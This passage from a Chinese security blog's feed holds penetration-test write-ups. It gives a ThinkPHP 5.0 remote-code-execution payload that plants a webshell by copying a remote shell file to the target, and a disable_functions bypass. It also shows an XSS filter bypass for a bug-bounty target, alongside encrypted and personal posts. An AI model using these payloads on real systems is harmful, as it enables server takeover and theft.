52e68a9883002615ea76549f6d679162357dfa7e9c5476cd24b73719de622359313ac3fe252ccc0ffa10038adba26fcde63fdb10a6e62fe3ceb9501aaeead8bae7497616cfbb786a7fc7386fe044ac0f3e85b079f3ea97517e788c269d8b595673d4217d136f77af6464b596d7851016e607bad4154a281298020e14c27bd6c557eb469c6968d1016b5f939f00b2d6f2685a3f27defd9a4240857e48c312ff67f8153bdca7ee0e2fccabf63bb4d287ceb5a039f9eaea6894f94cfc25e00f1951f55e370586f7e01791dc7d4adf76346f5471724df0926586f22b78b056830272cfc362f9f27c83a2ee8720902155e6c9c5ee3c51a0aeb12840a24e114afee139a0dadfe7f78dd54bf6f5b0653b8a50d5c4e8e3f7012c616b15293e879ede74ff539fc322cf7094216d111ccebecb9c0b525e7c33d4cbc9797d9bc405817eb942bc8f0dac18af7c8b5a7462c4af0e1a78841ab927108151837651651f02e397c9f2096283dcbf18b226131798f972148afeeb002086234b1aa01ad5d13d469de47709c19577b285f6c9cb25db58beeee87b1414360f144a87d33c64da0c813c0f4e2280c193396fc27e0d02172deeb7d2029dce51027891c3c1d31761bab24f577f24c052b89d60765fb2bfee9b1fffa626780e74b0ef0896e5aa9891aebdaa302fa04d1307798936775ed765ad43553effa26a60c4111885846a8fe724e1ca9da1198410df089c404c8486fc5005476cf53ec816810c72f6cc86517e525f9c00a8cf60c198da60eb75703b5f23bf2f8bb69ece72e279dc41ed9143dc1294363d4835d360c9a22e2e6901cb4851284d2d0e8fa7cf9e2b1839102daf9bc71dff733eb2f914795a9045f0f80d6b741a5ee940cac4f5b51640dd5015fe1dc3023ab8b9e94ed493811c8e9761f119af5c065b4a027fe1b0da0ee3ea4147aed2d902b819b2aad395a87299de9b2b8d38a115e0d10f88d75a53bcc0ced449a857074c8b47c125f6417f307300ef02c89a14da62d50425b3d2bdd02efb27901dae68317524d913b1556a71bbf79a88edf17e1479887f502c3b035b5943acea82c9853f19e5ed1aa8a659839637f86c8fdd228802d6f31d85dfb02ef9067954eb2577781c1ed68de54a9377a28ad1889e50719dca566c94633ce9ce5b628ec2c9615615f1903b20b60ea47c809a1fb2e1b29bb9e5a77e9dcb30ad8be16b4fa70751b1cd9ab655c59a267a30b29ae44d6b8341a6eb82b630a1fe0709c7053c9b2c8dfddf8e830188a0faa61458f5032819f0d44e590fbaf677e2b81d4963f7855d0c6b8c0337579fca8841f1829ddd0fe12ce7ff12cc1e763a3c2f1a1d0350784886f3d0b316dd81e69df05429dd8475d903b28f74ab04e362220bc60f5ea47fbd64233d7426844eb79ec61e647c04eb4ed4390a8804d7e2d0513a2cdf0a7c4503e2e3b2923e1451df9d6e59e76a8556a3b7ac74799f60683b595cd3beea65cc3eab34d99b02b319c60b5bfabb43b3638cff2d68c8bb01ff35b74fb8b74b77bcdac5202d29421b39338854fc6bc0ad9ce4c4810681efb52cf06f1b6a656f840e24ae3cbbe1a51f136fd90fe656b75d69e522ac195fe9b21edca2c33031af5fdce7397ca3e970e990056c394fb365415774cefa11c855bc9ea6ed2657f60dee4ece7c2d5686d27e138fe5e25414df0be093ee26047ba1bfd07dc34deaa43f412d80951516d0c01cfb61273eebe59c18e2b39be0d2b2b7cadf67ecf7bf275bb9d062b23f7705796b7cd0bbf07890bc16e032b3c8b7321add261f5de2f2908b083482795aac375d34b048f226868ed200410294d782024a4690e23b6f5145e884a96422ec560db46c12a952136695be9809ace6a043186b24d44421525dce783d559ee1ba6586087c02c61ef16fc1490488e75d80c99d3ab6bd2b4f23bcf53132f09c8110d8967c45312c9a03b03c0a66a2e1836c700aae4ce96aa8e55bfdab30f4cccb96c1348b6f283874339bcd17c7dce764aad1a0b1215958f980ad11902aad3d154282a6008c064b29b3bd83aa3ec98b8f3f462247d1d8a668a7ee4c889783e70e29378561e33b413930ae215cae822974ba3b55ae</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="一星期实战总结" scheme="https://www.se7ensec.cn/tags/%E4%B8%80%E6%98%9F%E6%9C%9F%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>渗透记实|ThinkPhp绕过限制GetShell</title>
    <link href="https://www.se7ensec.cn/2020/02/14/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%AE%9EThinkPhp%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6GetShell/"/>
    <id>https://www.se7ensec.cn/2020/02/14/%E6%B8%97%E9%80%8F%E8%AE%B0%E5%AE%9EThinkPhp%E7%BB%95%E8%BF%87%E9%99%90%E5%88%B6GetShell/</id>
    <published>2020-02-14T02:10:24.000Z</published>
    <updated>2020-11-14T19:59:20.128Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>文章首发无法溯源安全团队公众号</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>项目里遇到一个站，用的是ThinkPHP V5.0.*框架，且开启了debug模式，本以为一发payload的就能解决的事情，没想到拿下的过程还得小绕一下…</p><h1 id="0x02-踩坑"><a href="#0x02-踩坑" class="headerlink" title="0x02 踩坑"></a>0x02 踩坑</h1><ol><li>尝试命令执行，system被限制了</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/1.png"></p><ol start="2"><li>尝试包含日志文件，open_basedir限制了</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/2.png"></p><ol start="3"><li>这里有个思路，可以去包含runtime下的日志文件，但是thinkphp的日志文件比较大，而且有时候会有很多奇怪的问题阻断代码执行，暂且作为备选方案</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/3.png"></p><ol start="5"><li>尝试通过thinkphp本身Library中设置Session的方法把脚本写入tmp目录里的Session文件，然后进行包含</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;think\Session::set&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>但是。。。</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/4.png"></p><h1 id="0x03-GetShell"><a href="#0x03-GetShell" class="headerlink" title="0x03 GetShell"></a>0x03 GetShell</h1><p>俗话说，三个臭皮匠顶一个诸葛亮，求助师傅们后，给出了解决的办法</p><ol><li>Noel 师傅的解决方法及分析：</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/5.png"></p><p>Request.php的filtervalue函数下存在call_user_func,根据Payload，跟踪下流程</p><p>首先会进入App.php的Run方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">Request $request = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        ………………………………</span><br><span class="line">        <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">            <span class="comment">/*执行当前类的routeCheck方法,获取调度信息,如访问index模块下index控制器里的index方法,则</span></span><br><span class="line"><span class="comment">                $dispatch = array(2) &#123; [&quot;type&quot;]=&gt; string(6) &quot;module&quot;</span></span><br><span class="line"><span class="comment">                    [&quot;module&quot;]=&gt; array(3) &#123;</span></span><br><span class="line"><span class="comment">                        [0]=&gt; string(5) &quot;index&quot; [1]=&gt; string(5) &quot;index&quot; [2]=&gt; string(5) &quot;index&quot; &#125; &#125;</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            $dispatch = <span class="built_in">self</span>::routeCheck($request, $config);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录当前调度信息 将获取的调度信息,即模块,控制器,方法名存入Request类的dispatch属性中</span></span><br><span class="line">        $request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录路由和请求信息 调式模式,在\application\config.php 参数app_debug可配置</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::$debug) &#123;</span><br><span class="line">            Log::record(<span class="string">&#x27;[ ROUTE ] &#x27;</span> . var_export($dispatch, <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">            Log::record(<span class="string">&#x27;[ HEADER ] &#x27;</span> . var_export($request-&gt;header(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">            Log::record(<span class="string">&#x27;[ PARAM ] &#x27;</span> . var_export($request-&gt;param(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ………………………………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们主要关注routeCheck和param两个函数，先看routeCheck</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params">$request, <span class="keyword">array</span> $config</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $path   = $request-&gt;path();</span><br><span class="line">        $depr   = $config[<span class="string">&#x27;pathinfo_depr&#x27;</span>];</span><br><span class="line">        $result = <span class="literal">false</span>;</span><br><span class="line">      ………………………………</span><br><span class="line">        <span class="comment">// 路由检测（根据路由定义返回不同的URL调度）</span></span><br><span class="line">        $result = Route::check($request, $path, $depr, $config[<span class="string">&#x27;url_domain_deploy&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>主要是将请求参数什么的传入，经过check后就基本上都处理好了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/6.png"></p><p>在调试模式开启的情况下可以进入param函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;param)) &#123;</span><br><span class="line">            $method = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p> 跟进input函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params">$data = [], $name = <span class="string">&#x27;&#x27;</span>, $default = <span class="literal">null</span>, $filter = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">      $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line">      <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">          array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], $filter);</span><br><span class="line">          reset($data);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>getFilter取出filter的值，在这里也就是assert</p><p>array_walk_recursive</p><blockquote><p>array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。该函数与 <a href="https://www.runoob.com/php/func-array-walk.html">array_walk()</a> 函数的不同在于可以操作更深的数组（一个数组中包含另一个数组）。</p></blockquote><p>及对$data的每一个元素应用filterValue函数，跟进filterValue</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;$value, $key, $filters</span>)</span>&#123;</span><br><span class="line"> ......   </span><br><span class="line"><span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">                <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">                $value = call_user_func($filter, $value);</span><br><span class="line">            &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>铳梦师傅的解决方法及分析：</li></ol><p>payload参考：</p><p>来自：<a href="https://xz.aliyun.com/t/3570#toc-4">https://xz.aliyun.com/t/3570#toc-4</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><p>执行phpinfo（这里注意看 ?s= 后的参数）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;?s&#x3D;..&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><p>拿shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;?s&#x3D;..&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;copy(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;shell.txt&#39;,&#39;test.php&#39;)</span><br></pre></td></tr></table></figure><p>为什么要这么构造呢，给出当前的目录情况以及分析：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/7.png"></p><p>Route.php的parseUrl函数会对url进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span>(<span class="params">$url, $depr = <span class="string">&#x27;/&#x27;</span>, $autoSearch = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        .......</span><br><span class="line">        $url              = str_replace($depr, <span class="string">&#x27;|&#x27;</span>, $url);</span><br><span class="line">        <span class="keyword">list</span>($path, $var) = <span class="built_in">self</span>::parseUrlPath($url);</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先将url中的<code>/</code>替换为<code>|</code>之后是parseUrlPath将url分割</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrlPath</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">// 分隔符替换 确保路由定义使用统一的分隔符</span></span><br><span class="line">     $url = str_replace(<span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, $url);</span><br><span class="line">     $url = trim($url, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">     $var = [];</span><br><span class="line">     <span class="keyword">if</span> (<span class="literal">false</span> !== strpos($url, <span class="string">&#x27;?&#x27;</span>)) &#123;</span><br><span class="line">......</span><br><span class="line">         ......</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (strpos($url, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">         <span class="comment">// [模块/控制器/操作]</span></span><br><span class="line">         $path = explode(<span class="string">&#x27;/&#x27;</span>, $url);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         ......</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> [$path, $var];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>得到如下三部分</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/8.png"></p><p>模块加载时Loder.php下的parseName函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params">$name, $type = <span class="number">0</span>, $ucfirst = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($type) &#123;</span><br><span class="line">        $name = preg_replace_callback(<span class="string">&#x27;/_([a-zA-Z])/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$match</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> strtoupper($match[<span class="number">1</span>]);</span><br><span class="line">        &#125;, $name);</span><br><span class="line">        <span class="keyword">return</span> $ucfirst ? ucfirst($name) : lcfirst($name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> strtolower(trim(preg_replace(<span class="string">&quot;/[A-Z]/&quot;</span>, <span class="string">&quot;_\\0&quot;</span>, $name), <span class="string">&quot;_&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/9.png"></p><p>现在就会实例化\Think\app类并执行invokefunction方法</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/10.png"></p><p>所以加<code>../\</code>的原因是可以再往前跳一层</p><h1 id="0x04-bypass-disable-functions"><a href="#0x04-bypass-disable-functions" class="headerlink" title="0x04 bypass disable_functions"></a>0x04 bypass disable_functions</h1><p>查看禁用</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/11.png"></p><ol><li><p>一开始没仔细看禁用的内容，直接就用了这个</p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a> </p></li></ol><p>但是发现putenv被禁用了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/12.png"></p><ol start="2"><li>换个方法，通过这篇文章</li></ol><p><a href="https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/">https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/</a></p><p>了解到利用pcntl扩展，确认系统支持</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/13.png"></p><p>最终成功执行命令</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/14.png"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;文章首发无法溯源安全团队公众号&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="PHP" scheme="https://www.se7ensec.cn/tags/PHP/"/>
    
    <category term="GetShell" scheme="https://www.se7ensec.cn/tags/GetShell/"/>
    
  </entry>
  
  <entry>
    <title>某某街一处XSS的绕过思路</title>
    <link href="https://www.se7ensec.cn/2020/02/06/%E6%9F%90%E6%9F%90%E8%A1%97%E4%B8%80%E5%A4%84XSS%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
    <id>https://www.se7ensec.cn/2020/02/06/%E6%9F%90%E6%9F%90%E8%A1%97%E4%B8%80%E5%A4%84XSS%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</id>
    <published>2020-02-06T15:10:24.000Z</published>
    <updated>2020-11-14T19:56:20.594Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>众测吃便便</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>疫情影响，过年放假呆在家里实在无聊，上去某平台看了下众测项目，想着挣点口罩钱</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/1.png"></p><h1 id="0x02-直接闭合"><a href="#0x02-直接闭合" class="headerlink" title="0x02 直接闭合"></a>0x02 直接闭合</h1><p>一开始尝试直接去闭合<code>&lt;a&gt;</code>标签，发现 <code>&quot;&gt; </code>输出时会被实体化编码，遂放弃</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/2.png"></p><h1 id="0x03-javascript-伪协议"><a href="#0x03-javascript-伪协议" class="headerlink" title="0x03 javascript 伪协议"></a>0x03 javascript 伪协议</h1><p>因为输出是在<code>&lt;a&gt;</code>标签的 <code>href</code> 里面，所以去尝试伪协议，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain) </span><br></pre></td></tr></table></figure><p>提交后发现，输出的内容直接过滤掉了 <code>javascript: </code></p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/3.png"></p><p>经过几次尝试，通过以下payload绕过了过滤，成功弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;Tab;cript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/4.png"></p><p>不过一个小破弹窗怎么能证明危害</p><h1 id="0x04-绕过限制加载外部js"><a href="#0x04-绕过限制加载外部js" class="headerlink" title="0x04  绕过限制加载外部js"></a>0x04  绕过限制加载外部js</h1><p>直接用了xsshunter的payload，提交点击后，发现执行不能成功</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/5.png"></p><p>仔细对比下输出的内容和原始内容才发现，输出时所有的字符都强制转换小写了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/6.png"></p><p>这里先了解下xss中的 <a href="https://www.cnblogs.com/milantgh/p/4246342.html">编码问题</a>，eval中支持Unicode编码，最终构造的payload把大写的字母单独编码下即可</p><p>最终效果：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/7.png"></p><h1 id="0x05-报送结果"><a href="#0x05-报送结果" class="headerlink" title="0x05 报送结果"></a>0x05 报送结果</h1><p>本来以为好歹能混个中危，结果厂商认为这个点需要点击交互，给了低危。</p><p>申诉：评级的时候看下功能点，毕竟本来就是需要点击的业务功能。</p><p>厂商反馈：经过讨论，恶意链接为javascript开头利用难度较高，故维持评级低危。</p><h1 id="给👴爪巴"><a href="#给👴爪巴" class="headerlink" title="给👴爪巴"></a>给👴爪巴</h1>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;众测吃便便&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>回炉再造</title>
    <link href="https://www.se7ensec.cn/2020/01/20/%E5%9B%9E%E7%82%89%E5%86%8D%E9%80%A0/"/>
    <id>https://www.se7ensec.cn/2020/01/20/%E5%9B%9E%E7%82%89%E5%86%8D%E9%80%A0/</id>
    <published>2020-01-20T07:15:15.000Z</published>
    <updated>2020-11-14T19:56:49.726Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>安全技术学习，承认自己的弱点不是丑事。<br>只有对原理了然于心，才能突破更多的限制。        ——@ringzero </p></blockquote><a id="more"></a><p>一二三四，二二三四，转个圈圈，再来一次。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;安全技术学习，承认自己的弱点不是丑事。&lt;br&gt;只有对原理了然于心，才能突破更多的限制。        ——@ringzero &lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>迟来的年度总结</title>
    <link href="https://www.se7ensec.cn/2020/01/09/%E8%BF%9F%E6%9D%A5%E7%9A%84%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://www.se7ensec.cn/2020/01/09/%E8%BF%9F%E6%9D%A5%E7%9A%84%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2020-01-08T18:15:44.000Z</published>
    <updated>2020-11-14T19:56:10.114Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="534930972233cbd4101a9868038658fa4e5e432fda5ca8f68f13d48ac067ee09">1415c66757eec6f3f6373e1124982d58b3311bc876bcb0e0397e49af7fef20a7a6316d6b8cef3257b49f69802ec2a857daa3eca0da76f6b62b5ab2679256ece792b20a06af3bbbea36e5725f35a2308e07513261f90a47532744398b828434342d525d08530213403c4f832fc796ab663cfaa9e8f6e5625f43551d1066e92075a34484bd6bb65bf3393436d5bd8b938d46dc2a7f0205367c373b989ce6547a08ab633e5ea94314b26c663795b11f992d6fe557a90417facf2230ef19a64b7cf2856fb32a3011eb65cdbc419cc1593616ac7a26ee98bfbdc5172531aa34436be1efec9319199b8a9acc708c81fa38fd9402fd34f12dfd440c3e973096417ff338b953b9e2fb67e441e007082c889ba2b5c6b282e3117f411abad6a405722ce911309c472e3f26b504552fd287458a89b447a25635fab0bf1f3641dffe005b52665d1283ed8532854d5b9a9e196a79adc60c18bab21853c25c0f5bc3dfbb23ba96c208cd4a9508d4a3ba0c707346e9465771864b2b189c3d7a85548b8ba939962d24ff042469117238f253e4ccab7ae2df391f9444aceeb03bd4431cc64b4acbf98fb56c0f5c0fa0490f992e714c786ec75b13b925b1c89d2a40148db4db0ceb5abcd5795f024eb71fb3e5fed4dcea0e34cc1ac18710f86fc391f0fd426f26f56f12add483622cb03076a2ced6e1324af49a254628837715bc34c75c966fa8d5f312c5dcd493582529c0420e62f29a77a2bb6c22aea978a57b1a7dde5407b631cadf9ea3865f4f165e